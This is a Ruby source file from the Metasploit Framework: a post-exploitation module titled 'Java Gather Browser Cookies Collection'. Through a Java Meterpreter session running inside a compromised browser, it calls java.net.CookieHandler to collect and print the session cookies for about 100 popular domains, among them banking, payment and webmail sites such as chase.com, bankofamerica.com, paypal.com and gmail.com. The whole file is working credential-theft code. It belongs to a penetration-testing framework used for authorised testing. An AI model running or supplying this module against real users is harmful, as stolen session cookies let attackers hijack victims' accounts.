##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Java Gather Browser Cookies Collection',
			'Description'    => %q{
				This module will collect cookies for the 100 most popular domains
				according to http://www.google.com/adplanner/static/top1000/ via
				java.net.CookieHandler. This will only work with a Java Meterpreter
				session running inside a browser (i. e. Spawn = 0).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'mihi'
				],
			'Version'        => '$Revision$',
			'Platform'       => ['java'],
			'SessionTypes'   => ['meterpreter' ]
		))
	end

	def run
		client = session
		if client.jailgun == nil
			client.core.use('jailgun')
		end
		
		## java.net.CookieHandler ch = java.net.CookieHandler.getDefault();
		ch = client.jailgun.class_for_name('java.net.CookieHandler').invoke_static_method("getDefault", "")
		
		## if (ch == null)
		if ch == nil
			print_error "No CookieHandler registered. Are you sure you are running inside a browser?"
			return
		end
		
		## java.util.HashMap hdrs = new java.util.HashMap();
		hdrs = client.jailgun.class_for_name('java.util.HashMap').new_instance('')
		
		uri_class = client.jailgun.class_for_name('java.net.URI')

		hostnames.each { |hostname| 
			## java.util.Map value = ch.get(new java.net.URI("https://#{hostname}/"), hdrs);
			value = ch.invoke_instance_method('get', 'java.net.URI,java.util.Map', uri_class.new_instance('java.lang.String', "https://#{hostname}/"), hdrs)
			
			## int size = value.size()
			size = value.invoke_instance_method('size', '')
			
			if size == 0
				cookie = nil
			else
				## java.lang.Object cookie = value.get("Cookie");
				cookie = value.invoke_instance_method('get', 'java.lang.Object', 'Cookie')
				
				## if (cookie != null && cookie instanceof java.util.ArrayList)
				if (cookie != nil and cookie.class.name == 'java.util.ArrayList')
				
					## cookie = ((java.util.ArrayList)cookie).get(0);
					cookie = cookie.invoke_instance_method('get', 'int', 0)
				end
			end
			if cookie == nil
				vprint_status "#{hostname}: No cookies"
			else
				print_status "#{hostname}: #{cookie}"
			end
		}
	end
	
	def hostnames
		[
			"google.com",
			"gmail.com",
			# Source: http://www.google.com/adplanner/static/top1000/
			"facebook.com",
			"youtube.com",
			"yahoo.com",
			"live.com",
			"msn.com",
			"wikipedia.org",
			"blogspot.com",
			"baidu.com",
			"microsoft.com",
			"qq.com",
			"bing.com",
			"ask.com",
			"adobe.com",
			"taobao.com",
			"twitter.com",
			"youku.com",
			"soso.com",
			"wordpress.com",
			"sohu.com",
			"hao123.com",
			"windows.com",
			"163.com",
			"tudou.com",
			"amazon.com",
			"apple.com",
			"ebay.com",
			"4399.com",
			"yahoo.co.jp",
			"linkedin.com",
			"go.com",
			"tmall.com",
			"paypal.com",
			"sogou.com",
			"ifeng.com",
			"aol.com",
			"xunlei.com",
			"craigslist.org",
			"orkut.com",
			"56.com",
			"orkut.com.br",
			"about.com",
			"skype.com",
			"7k7k.com",
			"dailymotion.com",
			"flickr.com",
			"pps.tv",
			"qiyi.com",
			"bbc.co.uk",
			"4shared.com",
			"mozilla.com",
			"ku6.com",
			"imdb.com",
			"cnet.com",
			"babylon.com",
			"mywebsearch.com",
			"alibaba.com",
			"mail.ru",
			"uol.com.br",
			"badoo.com",
			"cnn.com",
			"myspace.com",
			"netflix.com",
			"weather.com",
			"soku.com",
			"weibo.com",
			"renren.com",
			"rakuten.co.jp",
			"17kuxun.com",
			"yandex.ru",
			"booking.com",
			"ehow.com",
			"bankofamerica.com",
			"58.com",
			"zedo.com",
			"2345.com",
			"globo.com",
			"mapquest.com",
			"goo.ne.jp",
			"answers.com",
			"360.cn",
			"chase.com",
			"naver.com",
			"hp.com",
			"odnoklassniki.ru",
			"alipay.com",
			"huffingtonpost.com",
			"ameblo.jp",
			"ganji.com",
			"alot.com",
			"scribd.com",
			"megaupload.com",
			"tumblr.com",
			"softonic.com",
			"camzap.com",
			"vkontakte.ru",
			"avg.com",
			"walmart.com",
			"pptv.com",
			"xinhuanet.com",
			"mediafire.com"
		]
	end
end
